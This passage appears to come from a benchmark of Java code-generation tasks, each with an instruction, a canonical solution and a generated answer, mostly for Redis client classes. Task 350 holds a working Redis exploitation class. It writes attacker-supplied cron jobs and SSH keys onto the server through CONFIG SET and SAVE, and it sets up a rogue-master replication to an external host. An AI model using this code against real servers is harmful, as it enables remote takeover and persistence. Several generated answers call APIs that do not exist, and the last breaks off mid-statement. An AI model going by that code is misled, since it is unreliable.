    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.FileChannel;\nimport java.nio.file.Path;\nimport java.util.function.LongSupplier;\n\npublic class WriteablePmtiles {\n    private final SeekableByteChannel out;\n    private final LongSupplier bytesWritten;\n\n    private WriteablePmtiles(SeekableByteChannel out, LongSupplier bytesWritten) {\n        this.out = out;\n        this.bytesWritten = bytesWritten;\n    }\n\n    public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n        FileChannel channel = FileChannel.open(path, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.WRITE);\n        return new WriteablePmtiles(channel, channel::position);\n    }\n\n    public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) {\n        return new WriteablePmtiles(bytes, bytes::position);\n    }\n\n    public void finish(TileArchiveMetadata tileArchiveMetadata) throws IOException {\n        // Placeholder for writing metadata and directory info\n        ByteBuffer buffer = tileArchiveMetadata.toByteBuffer();\n        out.write(buffer);\n    }\n\n    public long bytesWritten() {\n        return bytesWritten.getAsLong();\n    }\n\n    public void close() throws IOException {\n        if (out != null) {\n            out.close();\n        }\n    }\n\n    public class DeduplicatingTileWriter {\n        public void write(TileEncodingResult encodingResult) throws IOException {\n            ByteBuffer data = encodingResult.getData();\n            out.write(data);\n        }\n\n        public void close() throws IOException {\n            // No cleanup needed in this implementation\n        }\n    }\n}\n\ninterface SeekableInMemoryByteChannel extends SeekableByteChannel {}\nclass TileArchiveMetadata {\n    public ByteBuffer toByteBuffer() {\n        // Dummy method to simulate metadata conversion to ByteBuffer\n        return ByteBuffer.allocate(0);\n    }\n}\nclass TileEncodingResult {\n    public ByteBuffer getData() {\n        // Dummy method to simulate encoded tile data retrieval\n        return ByteBuffer.allocate(0);\n    }\n}\n```"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Java class that provides Redis database operations including connection management, configuration changes, data persistence, and cleanup operations.\n\nClass Description: The RedisDao class encapsulates Redis operations using the Jedis client. It handles connection establishment, authentication, configuration management, data persistence, and cleanup tasks. The class supports various Redis operations including slave configuration, cron job setup, SSH key injection, and system cleanup.\n\nAttributes:\n- CONN: Jedis - Static instance of Redis connection\n- dir: List<String> - Static list storing Redis directory configuration\n- slaveReadOnlyFlag: String - Static flag for slave read-only configuration (default \"yes\")\n- ip: String - Redis server IP address\n- port: int - Redis server port number\n- password: String - Redis authentication password\n- timeout: int - Connection timeout in milliseconds\n\nMethods:\n- testConnection(): void - Tests Redis connection by creating a temporary connection, authenticating if needed, retrieving server info, and closing the connection\n- getConnection(): void - Establishes a persistent Redis connection and authenticates if required\n- closeConnection(): void - Closes the active Redis connection\n- getInfo(): void - Retrieves Redis server information and configuration directory\n- redisavedb(String dir, String dbfilename): void - Configures Redis persistence directory and filename, then triggers a save operation\n- redisslave(String vpsIp, String vpsPort): void - Configures Redis as a slave of another instance\n- crontab(String cronText): void - Attempts to create cron jobs by writing to various cron directories\n- sshkey(String sshRsa, String Path): void - Writes SSH public key to specified directory as authorized_keys\n- clean(): void - Restores original Redis configuration and cleans up temporary data",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport java.util.List;\n\npublic class RedisDao {\n    public static Jedis CONN;\n    public static List<String> dir;\n    public static String slaveReadOnlyFlag = \"yes\";\n\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, String port, String password, String timeout) {\n        this.ip = ip;\n        this.port = Integer.parseInt(port);\n        this.password = password;\n        this.timeout = Integer.parseInt(timeout) * 1000;\n    }\n\n    public void testConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n        CONN.info();\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getConnection() throws Exception {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() throws Exception {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() throws Exception {\n        String info = CONN.info();\n        dir = CONN.configGet(\"dir\");\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n    }\n\n    public void crontab(String cronText) {\n        List<String> crondirs = Arrays.asList(\"/var/spool/cron/\", \"/var/spool/cron/crontab/\", \"/var/spool/cron/crontabs/\");\n        for (String dir : crondirs) {\n            try {\n                String randomString = Utils.getRandomString();\n                CONN.set(\"xxcron\", \"\\n\\n\" + cronText + \"\\n\\n\");\n                CONN.configSet(\"dir\", dir);\n                CONN.configSet(\"dbfilename\", randomString);\n                CONN.save();\n                break;\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String Path) {\n        CONN.set(\"xxssh\", \"\\n\\n\" + sshRsa + \"\\n\\n\");\n        CONN.configSet(\"dir\", Path);\n        CONN.configSet(\"dbfilename\", \"authorized_keys\");\n        CONN.save();\n    }\n\n    public void clean() {\n        CONN.configSet(\"dir\", dir.get(1));\n        CONN.configSet(\"slave-read-only\", slaveReadOnlyFlag);\n        CONN.configSet(\"dbfilename\", \"dump.rdb\");\n        CONN.slaveofNoOne();\n        CONN.moduleUnload(\"system\");\n        CONN.del(\"xxssh\");\n        CONN.del(\"xxcron\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport java.io.*;\nimport java.util.*;\n\npublic class RedisDao {\n    public static Jedis CONN;\n    public static List<String> dir = new ArrayList<>();\n    public static String slaveReadOnlyFlag = \"yes\";\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, int port, String password, int timeout) {\n        this.ip = ip;\n        this.port = port;\n        this.password = password;\n        this.timeout = timeout;\n    }\n\n    public void testConnection() {\n        Jedis tempConn = new Jedis(ip, port);\n        try {\n            if (!password.isEmpty()) {\n                tempConn.auth(password);\n            }\n            System.out.println(tempConn.info());\n        } finally {\n            tempConn.close();\n        }\n    }\n\n    public void getConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (!password.isEmpty()) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() {\n        String info = CONN.info(\"server\");\n        for (String line : info.split(\"\\r\\n\")) {\n            if (line.contains(\"dir:\")) {\n                dir.add(line.split(\":\")[1]);\n            }\n        }\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n        CONN.configSet(\"slave-read-only\", slaveReadOnlyFlag);\n    }\n\n    public void crontab(String cronText) {\n        List<String> cronPaths = Arrays.asList(\n            \"/etc/cron.d/redis-cron\",\n            \"/etc/cron.daily/redis-cron\",\n            \"/etc/cron.hourly/redis-cron\",\n            \"/etc/cron.weekly/redis-cron\"\n        );\n\n        for (String path : cronPaths) {\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(path))) {\n                writer.write(cronText);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String Path) {\n        File authorizedKeys = new File(Path + \"/authorized_keys\");\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(authorizedKeys))) {\n            writer.write(sshRsa);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void clean() {\n        if (!dir.isEmpty()) {\n            for (String d : dir) {\n                File directory = new File(d);\n                if (directory.exists()) {\n                    File[] files = directory.listFiles();\n                    if (files != null) {\n                        for (File file : files) {\n                            if (file.getName().startsWith(\"dump\")) {\n                                file.delete();\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        CONN.configSet(\"dir\", \"/\");\n        CONN.configSet(\"dbfilename\", \"dump.rdb\");\n        CONN.flushAll();\n        CONN.slaveof(\"NO\", \"ONE\");\n    }\n}\n```"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, allowing read operations to prefer the master node while maintaining failover capabilities.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave cluster, manage the connection, and properly clean up resources when done. It uses Lettuce's MasterReplica API for high availability support.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance used for connection management\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to the Redis master-slave cluster\n\nMethods:\n- RedisMasterSlaveConnector() -> void - Constructor that initializes the RedisClient instance\n- connect(List<RedisURI> nodes) -> void - Establishes a connection to the Redis master-slave cluster using the provided node URIs and configures read preference\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- close() -> void - Properly closes the connection and shuts down the Redis client to release resources",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        this.connection = MasterReplica.connect(redisClient, StringCodec.UTF8, nodes);\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.models.role.RedisInstance;\nimport io.lettuce.core.models.role.RedisNode;\nimport io.lettuce.core.protocol.RedisURI;\n\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n    private final RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        connection = redisClient.connectMasterReplica(nodes);\n        connection.setReadFrom(RedisInstance.Role.MASTER);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Lettuce client, supporting batch operations with asynchronous command execution.\n\nClass Description: The RedisConnectionManager class provides a way to establish, manage, and close Redis connections using Lettuce client. It supports binary data operations through ByteArrayCodec and maintains a batch of asynchronous commands for execution.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte arrays as key/value format\n- BATCH_SIZE: int (static final) - Constant defining the maximum number of commands in a batch\n- commands: CompletableFuture[] - Array to store asynchronous command futures for batch operations\n\nMethods:\n- setupConnection(): void - Initializes the Redis client and establishes a connection using test settings (host and port from TestSettings)\n- getConnection(): StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection\n- closeConnection(): void - Properly closes the Redis connection and shuts down the client\n- getCommandFutures(): CompletableFuture[] - Returns the array of command futures for batch operations\n- getBatchSize(): int - Returns the constant batch size value",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private static final int BATCH_SIZE = 20;\n    private CompletableFuture[] commands;\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n        commands = new CompletableFuture[BATCH_SIZE];\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.StatefulRedisConnection;\nimport io.lettuce.core.api.async.BaseRedisAsyncCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisConnectionManager {\n    private static final int BATCH_SIZE = 100;\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private CompletableFuture<?>[] commands = new CompletableFuture<?>[BATCH_SIZE];\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(TestSettings.REDIS_URI);\n        connection = redisClient.connect(new ByteArrayCodec());\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture<?>[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}\n```"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Create a Java class that manages Redis connections and operations using the Jedis client library, providing connection pooling and basic CRUD functionality.\n\nClass Description: RedisConnectionManager is a utility class that handles Redis connection management, authentication, and basic operations. It uses JedisPooled for connection pooling and provides thread-safe access to Redis resources.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection manager\n- poolConfig: GenericObjectPoolConfig<Connection> - Configuration for the connection pool\n\nMethods:\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) -> void - Constructor that initializes the connection with host/port and client configuration\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) -> void - Constructor with additional pool configuration\n- getConnection() -> Connection - Gets a connection from the pool\n- closeConnection(Connection connection) -> void - Returns a connection to the pool\n- setCredentialsProvider(RedisCredentialsProvider credentialsProvider) -> void - Updates the authentication credentials\n- executeCommand(String key, String value) -> void - Executes a SET command\n- getValue(String key) -> String - Executes a GET command and returns the value\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.RedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentials;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig);\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, \n                                GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig, poolConfig);\n    }\n\n    public Connection getConnection() throws JedisException {\n        return jedisPool.getPool().getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n            .credentialsProvider(credentialsProvider)\n            .build();\n        this.jedisPool = new JedisPooled(jedisPool.getPool().getAddress(), clientConfig);\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.SET, key, value);\n            String response = connection.getStatusCodeReply();\n            if (!\"OK\".equals(response)) {\n                throw new JedisException(\"Failed to set key: \" + key);\n            }\n        }\n    }\n\n    public String getValue(String key) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.GET, key);\n            return connection.getBulkReply();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.util.GenericObjectPoolConfig;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class RedisConnectionManager {\n\n    private final JedisPooled jedisPool;\n    private final GenericObjectPoolConfig<Connection> poolConfig;\n    private RedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this(new GenericObjectPoolConfig<>(), hostAndPort, clientConfig);\n    }\n\n    public RedisConnectionManager(GenericObjectPoolConfig<Connection> poolConfig, HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.poolConfig = poolConfig;\n        try {\n            URI uri = new URI(\"redis://\" + hostAndPort.getHost() + \":\" + hostAndPort.getPort());\n            this.jedisPool = new JedisPooled(poolConfig, uri, clientConfig);\n        } catch (URISyntaxException e) {\n            throw new RuntimeException(\"Invalid Redis URI\", e);\n        }\n    }\n\n    public Connection getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        if (connection instanceof JedisPooled.JedisResource) {\n            ((JedisPooled.JedisResource) connection).close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        this.credentialsProvider = credentialsProvider;\n        if (jedisPool != null && jedisPool.getClientConfig() instanceof DefaultJedisClientConfig) {\n            DefaultJedisClientConfig.Builder builder = DefaultJedisClientConfig.builder()\n                    .user(credentialsProvider.getUsername())\n                    .password(credentialsProvider.getPassword())\n                    .useSsl(false);\n            jedisPool.setClientConfig(builder.build());\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Connection connection = getConnection()) {\n            if (connection instanceof Jedis) {\n                ((Jedis) connection).set(key, value);\n            }\n        }\n    }\n\n    public String getValue(String key) {\n        try (Connection connection = getConnection()) {\n            if (connection instanceof Jedis) {\n                return ((Jedis) connection).get(key);\n            }\n        }\n        return null;\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis using Unix domain sockets, perform basic Redis operations, and manage connection lifecycle.\n\nClass Description: The RedisSocketConnector class enables interaction with Redis server through Unix domain sockets. It handles connection establishment, basic key-value operations, and proper resource cleanup. The class also includes utility methods for Redis URI creation and socket support detection.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used for connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- connect(RedisURI redisURI) -> void - Establishes a connection to Redis using the provided URI\n- performRedisAction(String key, String value) -> void - Performs a set and get operation on the specified key-value pair\n- close() -> void - Closes the Redis connection and shuts down the client\n- createSocketRedisUri(String socketPath) -> RedisURI - Creates a Redis URI for socket connection from the given path\n- isSupported() -> boolean - Checks if domain sockets are supported on the current system",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.resource.Transports;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.netty.util.internal.SystemPropertyUtil;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Locale;\n\npublic class RedisSocketConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void connect(RedisURI redisURI) {\n        redisClient = RedisClient.create(TestClientResources.get(), redisURI);\n        connection = redisClient.connect();\n    }\n\n    public void performRedisAction(String key, String value) {\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.set(key, value);\n        String result = syncCommands.get(key);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public static RedisURI createSocketRedisUri(String socketPath) throws IOException {\n        File file = new File(socketPath).getCanonicalFile();\n        return RedisURI.create(RedisURI.URI_SCHEME_REDIS_SOCKET + \"://\" + file.getCanonicalPath());\n    }\n\n    public static boolean isSupported() {\n        String osName = SystemPropertyUtil.get(\"os.name\").toLowerCase(Locale.UK).trim();\n        return Transports.NativeTransports.isDomainSocketSupported();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.StringStringMapCommands;\n\npublic class RedisSocketConnector {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void connect(RedisURI redisURI) {\n        redisClient = RedisClient.create(redisURI);\n        connection = redisClient.connect();\n    }\n\n    public void performRedisAction(String key, String value) {\n        StringStringMapCommands<String, String> commands = connection.sync();\n        commands.set(key, value);\n        String result = commands.get(key);\n        System.out.println(\"Retrieved value: \" + result);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public static RedisURI createSocketRedisUri(String socketPath) {\n        return RedisURI.builder()\n                .withPath(socketPath)\n                .withTimeout(60, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    public static boolean isSupported() {\n        try {\n            RedisURI.createUnixDomainSocket(null);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a Redis Sentinel connection provider class in Java that manages connections to a Redis master node through Sentinel monitoring, including automatic failover handling.\n\nClass Description: SentineledConnectionProvider is a class that provides managed connections to a Redis master node in a Sentinel-monitored environment. It automatically discovers the current master through Sentinel nodes and maintains a connection pool to it. The class also includes a listener thread that monitors for master failover events and updates the connection pool accordingly.\n\nAttributes:\n- currentMaster: [HostAndPort] - The current master node's host and port\n- pool: [ConnectionPool] - The connection pool to the current master node\n- masterName: [String] - The name of the Redis master as configured in Sentinel\n- masterClientConfig: [JedisClientConfig] - Configuration for connections to the master node\n- sentinelClientConfig: [JedisClientConfig] - Configuration for connections to Sentinel nodes\n\nMethods:\n- SentineledConnectionProvider([String] masterName, [JedisClientConfig] masterClientConfig, [Set<HostAndPort>] sentinels, [JedisClientConfig] sentinelClientConfig) -> [void] - Constructor that initializes the connection provider with master name, configurations, and Sentinel nodes\n- getConnection() -> [Connection] - Retrieves a connection from the pool to the current master node\n- initMaster([HostAndPort] master) -> [void] - Initializes or updates the connection pool to the specified master node\n- initSentinels([Set<HostAndPort>] sentinels) -> [HostAndPort] - Discovers the current master node through Sentinel nodes\n- SentinelListener([HostAndPort] node) -> [void] - Nested class constructor for Sentinel listener thread\n- run() -> [void] - Main execution method of the Sentinel listener thread (overrides Thread.run())\n- shutdown() -> [void] - Shuts down the Sentinel listener thread",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\n\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class SentineledConnectionProvider {\n\n  private static final Logger LOG = LoggerFactory.getLogger(SentineledConnectionProvider.class);\n\n  private volatile HostAndPort currentMaster;\n  private volatile ConnectionPool pool;\n  private final String masterName;\n  private final JedisClientConfig masterClientConfig;\n  private final JedisClientConfig sentinelClientConfig;\n\n  public SentineledConnectionProvider(String masterName, final JedisClientConfig masterClientConfig,\n      Set<HostAndPort> sentinels, final JedisClientConfig sentinelClientConfig) {\n    this.masterName = masterName;\n    this.masterClientConfig = masterClientConfig;\n    this.sentinelClientConfig = sentinelClientConfig;\n\n    HostAndPort master = initSentinels(sentinels);\n    initMaster(master);\n  }\n\n  public Connection getConnection() {\n    return pool.getResource();\n  }\n\n  private void initMaster(HostAndPort master) {\n    if (!master.equals(currentMaster)) {\n      currentMaster = master;\n      pool = new ConnectionPool(currentMaster, masterClientConfig);\n      LOG.info(\"Created connection pool to master at {}.\", master);\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n\n    for (HostAndPort sentinel : sentinels) {\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n\n        if (masterAddr == null || masterAddr.size() != 2) {\n          continue;\n        }\n\n        master = new HostAndPort(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Could not get master address from {}.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored.\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where \" + masterName + \" is running.\");\n      }\n    }\n\n    return master;\n  }\n\n  protected class SentinelListener extends Thread {\n    protected final HostAndPort node;\n    protected volatile Jedis sentinelJedis;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public SentinelListener(HostAndPort node) {\n      this.node = node;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n\n      while (running.get()) {\n        try {\n          sentinelJedis = new Jedis(node, sentinelClientConfig);\n          sentinelJedis.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3 && masterName.equals(switchMasterMsg[0])) {\n                initMaster(new HostAndPort(switchMasterMsg[3], Integer.parseInt(switchMasterMsg[4])));\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            try {\n              Thread.sleep(5000);\n            } catch (InterruptedException se) {\n              LOG.error(\"Sleep interrupted.\", se);\n            }\n          }\n        } finally {\n          IOUtils.closeQuietly(sentinelJedis);\n        }\n      }\n    }\n\n    public void shutdown() {\n      running.set(false);\n      if (sentinelJedis != null) {\n        sentinelJedis.close();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfiguration;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisSentinelPool;\n\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class SentineledConnectionProvider {\n    private HostAndPort currentMaster;\n    private JedisPool pool;\n    private final String masterName;\n    private final JedisClientConfiguration masterClientConfig;\n    private final JedisClientConfiguration sentinelClientConfig;\n    private final Set<HostAndPort> sentinels = new CopyOnWriteArraySet<>();\n    private SentinelListener sentinelListener;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfiguration masterClientConfig, Set<HostAndPort> sentinels, JedisClientConfiguration sentinelClientConfig) {\n        this.masterName = masterName;\n        this.masterClientConfig = masterClientConfig;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.sentinels.addAll(sentinels);\n        initMaster(initSentinels(sentinels));\n        sentinelListener = new SentinelListener();\n        sentinelListener.start();\n    }\n\n    public Jedis getConnection() {\n        return pool.getResource();\n    }\n\n    void initMaster(HostAndPort master) {\n        if (pool != null) {\n            pool.close();\n        }\n        currentMaster = master;\n        pool = new JedisPool(masterClientConfig, master.getHost(), master.getPort());\n    }\n\n    HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n        JedisSentinelPool sentinelPool = new JedisSentinelPool(masterName, sentinels, sentinelClientConfig);\n        HostAndPort master = sentinelPool.getCurrentMaster();\n        sentinelPool.close();\n        return master;\n    }\n\n    class SentinelListener extends Thread {\n        private final AtomicBoolean running = new AtomicBoolean(true);\n\n        @Override\n        public void run() {\n            while (running.get()) {\n                try {\n                    Thread.sleep(1000);\n                    HostAndPort newMaster = initSentinels(sentinels);\n                    if 